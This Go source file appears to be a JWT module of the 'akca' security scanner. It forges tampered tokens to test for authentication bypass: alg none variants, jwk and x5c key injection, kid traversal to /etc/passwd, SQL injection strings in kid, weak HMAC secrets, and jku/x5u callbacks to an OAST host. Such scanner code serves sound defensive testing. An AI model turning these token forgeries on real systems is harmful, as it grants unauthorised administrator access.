package modules

import (
	"context"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/akha-security/akca/engine/internal/config"
	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/verification"
)

var (
	testRSAKeyOnce    sync.Once
	testRSAPrivateKey *rsa.PrivateKey
	testRSACertDER    []byte
)

func getTestRSAKey() (*rsa.PrivateKey, []byte) {
	testRSAKeyOnce.Do(func() {
		priv, err := rsa.GenerateKey(rand.Reader, 2048)
		if err == nil {
			testRSAPrivateKey = priv
			template := x509.Certificate{
				SerialNumber: big.NewInt(1337),
				Subject: pkix.Name{
					CommonName: "akca-security-signer",
				},
				NotBefore: time.Now().Add(-1 * time.Hour),
				NotAfter:  time.Now().Add(24 * time.Hour),
				KeyUsage:  x509.KeyUsageDigitalSignature,
			}
			certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
			if err == nil {
				testRSACertDER = certDER
			}
		}
	})
	return testRSAPrivateKey, testRSACertDER
}

func signRS256(toSign string, priv *rsa.PrivateKey) string {
	hashed := sha256.Sum256([]byte(toSign))
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, hashed[:])
	if err != nil {
		return ""
	}
	return base64.RawURLEncoding.EncodeToString(sig)
}

func (r *Runner) runJWT(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("jwt", target); !ok {
		r.emitSkip("jwt", target, reason)
		return nil
	}
	validToken := r.capturedJWTForTarget(target)
	if validToken == "" {
		r.emitSkip("jwt", target, "JWT proof requires a captured valid token")
		return nil
	}
	valid, err := r.probeWithHeaders(ctx, target, "", map[string]string{"Authorization": "Bearer " + validToken})
	if err != nil || valid.Response.StatusCode < 200 || valid.Response.StatusCode >= 300 {
		return nil
	}
	validIdentity := jwtIdentityFromResponse(valid.Response)
	if validIdentity == "" {
		r.emitSkip("jwt", target, "protected endpoint did not return a stable identity")
		return nil
	}

	// 1. Check for Unverified JWT Signature (Server does not verify signatures at all)
	if unverifiedToken, ok := tamperJWTUnverifiedSignature(validToken, "akca-admin"); ok {
		unverifiedResp, err := r.probeWithHeaders(ctx, target, "", map[string]string{"Authorization": "Bearer " + unverifiedToken})
		if err == nil && unverifiedResp.Response.StatusCode >= 200 && unverifiedResp.Response.StatusCode < 300 {
			probeIdentity := jwtIdentityFromResponse(unverifiedResp.Response)
			if probeIdentity != "" && (probeIdentity != validIdentity || strings.Contains(strings.ToLower(probeIdentity), "akca-admin")) {
				payload := defaultPayload("jwt", "unverified_signature", unverifiedToken, "identity_change_confirmed")
				finding := r.verifyAndBuildWithCandidate(ctx, "jwt", target, payload, valid, unverifiedResp,
					"identity_change_confirmed", false, false, "", "", func(candidate *verification.Candidate) {
						candidate.RequestedProofType = verification.ProofIdentityBoundary
						candidate.Observations = append(candidate.Observations,
							r.identityObservation("jwt", target, verification.RoleIdentityA, 1, validIdentity, valid),
							r.identityObservation("jwt", target, verification.RoleIdentityB, 1, probeIdentity, unverifiedResp),
						)
					})
				if finding != nil {
					finding.Title = "JWT Signature Not Verified"
					finding.Description = "The server accepted a JWT with an altered payload and invalid signature, indicating that JWT signatures are not being verified by the application logic."
					finding.Severity = "critical"
					var out []ModuleFinding
					r.recordFinding(ctx, &out, finding, "jwt", "unverified_signature")
					return out
				}
			}
		}
	}

	invalidToken := invalidateJWTSignature(validToken)
	invalid, err := r.probeWithHeaders(ctx, target, "", map[string]string{"Authorization": "Bearer " + invalidToken})
	if err != nil || jwtIdentityFromResponse(invalid.Response) == validIdentity {
		return nil
	}
	expiredToken := capturedExpiredJWT(r.cfg)
	var expired httpclient.RequestResponse
	if expiredToken != "" {
		expired, _ = r.probeWithHeaders(ctx, target, "", map[string]string{"Authorization": "Bearer " + expiredToken})
	}

	oastURL := ""
	if r.cfg.EnableOAST && r.oast != nil {
		oastURL = strings.TrimSpace(r.oastURL(ctx, "jwt-jku", target, "jwt"))
	}

	type tamperSpec struct {
		name, token, desc, vulnClass string
	}

	var tamperProbes []tamperSpec

	// alg: none matrix
	for _, p := range tamperJWTNoneMatrix(validToken, "akca-admin") {
		tamperProbes = append(tamperProbes, tamperSpec{
			name: p.name, token: p.token,
			desc:      fmt.Sprintf("JWT signature bypass via '%s' algorithm variation.", p.name),
			vulnClass: "alg_none",
		})
	}

	// jwk embedded key injection
	if t, ok := tamperJWTJWK(validToken, "akca-admin"); ok {
		tamperProbes = append(tamperProbes, tamperSpec{
			name: "jwk_header_injection", token: t,
			desc:      "JWT signature bypass via unverified embedded 'jwk' header parameter.",
			vulnClass: "jwk_injection",
		})
	}

	// x5c certificate chain injection
	if t, ok := tamperJWTX5C(validToken, "akca-admin"); ok {
		tamperProbes = append(tamperProbes, tamperSpec{
			name: "x5c_header_injection", token: t,
			desc:      "JWT signature bypass via unverified 'x5c' certificate chain header parameter.",
			vulnClass: "x5c_injection",
		})
	}

	// kid path traversal and SQLi
	kidSpecs := []struct {
		name, kid, secret string
	}{
		{"kid_null", "/dev/null", ""},
		{"kid_traversal", "../../../../dev/null", ""},
		{"kid_etc_passwd", "../../../../etc/passwd", ""},
		{"kid_sqli", "' UNION SELECT 'akca_secret'-- -", "akca_secret"},
		{"kid_sqli_or", "key' OR '1'='1", ""},
		{"hmac_blank_secret", "", ""},
		{"hmac_weak_secret", "", "secret"},
	}
	for _, ks := range kidSpecs {
		if t, ok := tamperJWTKid(validToken, "akca-admin", ks.kid, ks.secret); ok {
			tamperProbes = append(tamperProbes, tamperSpec{
				name: ks.name, token: t,
				desc:      fmt.Sprintf("JWT signature bypass via 'kid' manipulation (%s).", ks.name),
				vulnClass: "kid_manipulation",
			})
		}
	}

	// OAST jku / x5u / kid callbacks
	if oastURL != "" {
		if t, ok := tamperJWTOASTHeader(validToken, "akca-admin", oastURL+"/jwks.json", "jku"); ok {
			tamperProbes = append(tamperProbes, tamperSpec{
				name: "jku_header_injection", token: t,
				desc:      "Unverified JWT 'jku' parameter allowed SSRF / external key set loading.",
				vulnClass: "jku_ssrf",
			})
		}
		if t, ok := tamperJWTOASTHeader(validToken, "akca-admin", oastURL+"/cert.pem", "x5u"); ok {
			tamperProbes = append(tamperProbes, tamperSpec{
				name: "x5u_header_injection", token: t,
				desc:      "Unverified JWT 'x5u' parameter allowed SSRF / external certificate loading.",
				vulnClass: "x5u_ssrf",
			})
		}
		if t, ok := tamperJWTOASTHeader(validToken, "akca-admin", oastURL+"/key", "kid"); ok {
			tamperProbes = append(tamperProbes, tamperSpec{
				name: "kid_url_injection", token: t,
				desc:      "Unverified JWT 'kid' parameter allowed remote URL callback.",
				vulnClass: "kid_ssrf",
			})
		}
	}

	for _, tp := range tamperProbes {
		if tp.token == "" || ctx.Err() != nil {
			continue
		}
		probe, err := r.probeWithHeaders(ctx, target, "", map[string]string{"Authorization": "Bearer " + tp.token})
		if err != nil || probe.Response.StatusCode < 200 || probe.Response.StatusCode >= 300 {
			continue
		}
		probeIdentity := jwtIdentityFromResponse(probe.Response)
		if probeIdentity == "" || probeIdentity == validIdentity || !strings.Contains(strings.ToLower(probeIdentity), "akca-admin") {
			continue
		}
		payload := defaultPayload("jwt", tp.name, tp.token, "identity_change_confirmed")
		finding := r.verifyAndBuildWithCandidate(ctx, "jwt", target, payload, valid, probe,
			"identity_change_confirmed", false, false, "", "", func(candidate *verification.Candidate) {
				candidate.RequestedProofType = verification.ProofIdentityBoundary
				candidate.NegativeControlSet = true
				candidate.NegativeControlOK = true
				obs := []verification.Observation{
					r.identityObservation("jwt", target, verification.RoleIdentityA, 1, validIdentity, valid),
					r.identityObservation("jwt", target, verification.RoleIdentityB, 1, probeIdentity, probe),
					r.identityObservation("jwt", target, verification.RoleAnonymousControl, 1, "invalid_signature", invalid),
				}
				if expiredToken != "" && expired.Response.StatusCode > 0 {
					obs = append(obs, r.identityObservation("jwt", target, verification.RoleExpiredSessionControl, 1, "expired_token", expired))
				}
				candidate.Observations = append(candidate.Observations, obs...)
			})
		if finding != nil {
			finding.Title = fmt.Sprintf("JWT Authentication Bypass (%s)", tp.name)
			finding.Description = fmt.Sprintf("A captured valid JWT established the original identity; invalid-signature control was rejected; a tampered token (%s) successfully changed the protected identity to akca-admin. %s", tp.name, tp.desc)
			finding.Severity = "critical"
			var out []ModuleFinding
			r.recordFinding(ctx, &out, finding, "jwt", "identity_change_confirmed")
			return out
		}
	}
	return nil
}

func (r *Runner) capturedJWTForTarget(target ScanTarget) string {
	if tok := capturedJWT(r.cfg); tok != "" {
		return tok
	}
	if tok := capturedJWTFromHeaders(target.RequestTemplate.Headers); tok != "" {
		return tok
	}
	if cookieHeader, ok := target.RequestTemplate.Headers["Cookie"]; ok {
		if tok := extractJWTFromCookieHeader(cookieHeader); tok != "" {
			return tok
		}
	}
	if u, err := url.Parse(target.EndpointURL); err == nil {
		for _, vals := range u.Query() {
			for _, v := range vals {
				if validJWTShape(v) {
					return v
				}
			}
		}
	}
	return ""
}

func extractJWTFromCookieHeader(cookieHeader string) string {
	for _, cookie := range strings.Split(cookieHeader, ";") {
		parts := strings.SplitN(strings.TrimSpace(cookie), "=", 2)
		if len(parts) == 2 && validJWTShape(parts[1]) {
			return parts[1]
		}
	}
	return ""
}

func capturedExpiredJWT(cfg config.ScanConfig) string {
	now := time.Now().Unix()
	for _, token := range cfg.JWTExpiredTokens {
		if !validJWTShape(token) {
			continue
		}
		claims := decodeJWTPart(strings.Split(token, ".")[1])
		if claims == nil {
			continue
		}
		if exp, ok := claims["exp"].(float64); ok && int64(exp) < now {
			return token
		}
	}
	return ""
}

func capturedJWT(cfg config.ScanConfig) string {
	if token := capturedJWTFromHeaders(cfg.CustomHeaders); token != "" {
		return token
	}
	for _, profile := range cfg.AuthProfiles {
		if token := capturedJWTFromHeaders(profile.Headers); token != "" {
			return token
		}
	}
	return ""
}

func capturedJWTFromHeaders(headers map[string]string) string {
	for key, value := range headers {
		if !strings.EqualFold(key, "Authorization") {
			continue
		}
		parts := strings.Fields(value)
		if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") && validJWTShape(parts[1]) {
			return parts[1]
		}
	}
	return ""
}

func validJWTShape(token string) bool {
	parts := strings.Split(token, ".")
	return (len(parts) == 3 || len(parts) == 2) && decodeJWTPart(parts[0]) != nil && decodeJWTPart(parts[1]) != nil
}

func invalidateJWTSignature(token string) string {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return ""
	}
	sig := base64.RawURLEncoding.EncodeToString([]byte("akca-invalid-signature"))
	return parts[0] + "." + parts[1] + "." + sig
}

func tamperJWTUnverifiedSignature(token, identity string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	sig := "akca-tampered-invalid-sig"
	if len(parts) == 3 && parts[2] != "" {
		sig = parts[2]
	}
	return hb + "." + pb + "." + sig, true
}

func tamperJWTNoneMatrix(token, identity string) []struct{ name, token string } {
	var out []struct{ name, token string }
	for _, alg := range []string{"none", "None", "NONE", "nOnE"} {
		if t, ok := tamperJWTNonePermutation(token, identity, alg, true); ok {
			out = append(out, struct{ name, token string }{name: "alg_" + alg, token: t})
		}
		if t, ok := tamperJWTNonePermutation(token, identity, alg, false); ok {
			out = append(out, struct{ name, token string }{name: "alg_" + alg + "_no_dot", token: t})
		}
	}
	return out
}

func tamperJWTNone(token, identity string) (string, bool) {
	return tamperJWTNonePermutation(token, identity, "none", true)
}

func tamperJWTNonePermutation(token, identity, algVal string, trailingDot bool) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header["alg"] = algVal
	header["typ"] = "JWT"
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	if trailingDot {
		return hb + "." + pb + ".", true
	}
	return hb + "." + pb, true
}

func tamperJWTJWK(token, identity string) (string, bool) {
	priv, _ := getTestRSAKey()
	if priv == nil {
		return "", false
	}
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header["alg"] = "RS256"
	header["typ"] = "JWT"
	nBytes := priv.PublicKey.N.Bytes()
	eBytes := big.NewInt(int64(priv.PublicKey.E)).Bytes()
	header["jwk"] = map[string]interface{}{
		"kty": "RSA",
		"use": "sig",
		"n":   base64.RawURLEncoding.EncodeToString(nBytes),
		"e":   base64.RawURLEncoding.EncodeToString(eBytes),
		"kid": "akca-injected-jwk",
	}
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	toSign := hb + "." + pb
	sig := signRS256(toSign, priv)
	if sig == "" {
		return "", false
	}
	return toSign + "." + sig, true
}

func tamperJWTX5C(token, identity string) (string, bool) {
	priv, certDER := getTestRSAKey()
	if priv == nil || len(certDER) == 0 {
		return "", false
	}
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header["alg"] = "RS256"
	header["typ"] = "JWT"
	header["x5c"] = []string{base64.StdEncoding.EncodeToString(certDER)}
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	toSign := hb + "." + pb
	sig := signRS256(toSign, priv)
	if sig == "" {
		return "", false
	}
	return toSign + "." + sig, true
}

func tamperJWTHMAC(token, identity, secret string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header["alg"] = "HS256"
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	toSign := hb + "." + pb
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(toSign))
	sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
	return toSign + "." + sig, true
}

func tamperJWTOASTHeader(token, identity, oastURL, headerKey string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 || oastURL == "" {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header[headerKey] = oastURL
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	sig := "akca-sig"
	if len(parts) == 3 && parts[2] != "" {
		sig = parts[2]
	}
	return hb + "." + pb + "." + sig, true
}

func tamperJWTKid(token, identity, kidVal, secret string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", false
	}
	header := decodeJWTPart(parts[0])
	claims := decodeJWTPart(parts[1])
	if header == nil || claims == nil {
		return "", false
	}
	header["alg"] = "HS256"
	header["kid"] = kidVal
	claims["sub"] = identity
	claims["role"] = identity
	claims["admin"] = true
	headerRaw, _ := json.Marshal(header)
	claimsRaw, _ := json.Marshal(claims)
	hb := base64.RawURLEncoding.EncodeToString(headerRaw)
	pb := base64.RawURLEncoding.EncodeToString(claimsRaw)
	toSign := hb + "." + pb
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(toSign))
	sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
	return toSign + "." + sig, true
}

func jwtIdentityFromResponse(response httpclient.ResponseRecord) string {
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return ""
	}
	var value interface{}
	if json.Unmarshal([]byte(response.Body), &value) != nil {
		return ""
	}
	var parts []string
	collectIdentityFields(value, &parts)
	sort.Strings(parts)
	return strings.Join(parts, "|")
}

func collectIdentityFields(value interface{}, out *[]string) {
	switch typed := value.(type) {
	case map[string]interface{}:
		for key, child := range typed {
			switch strings.ToLower(key) {
			case "sub", "user_id", "username", "email", "role":
				if text, ok := child.(string); ok && text != "" {
					*out = append(*out, key+"="+text)
				}
			}
			collectIdentityFields(child, out)
		}
	case []interface{}:
		for _, child := range typed {
			collectIdentityFields(child, out)
		}
	}
}

func buildJWT(alg, headerJSON, payloadJSON string) string {
	hb := base64.RawURLEncoding.EncodeToString([]byte(headerJSON))
	pb := base64.RawURLEncoding.EncodeToString([]byte(payloadJSON))
	if alg == "none" {
		return hb + "." + pb + "."
	}
	sig := base64.RawURLEncoding.EncodeToString([]byte("akca-sig"))
	return hb + "." + pb + "." + sig
}

func jwtSignal(body, baseline, signal string) bool {
	return signal == "identity_change_confirmed" && body != baseline &&
		strings.Contains(strings.ToLower(body), "akca-admin")
}

func decodeJWTPart(part string) map[string]interface{} {
	raw, err := base64.RawURLEncoding.DecodeString(part)
	if err != nil {
		return nil
	}
	var out map[string]interface{}
	_ = json.Unmarshal(raw, &out)
	return out
}
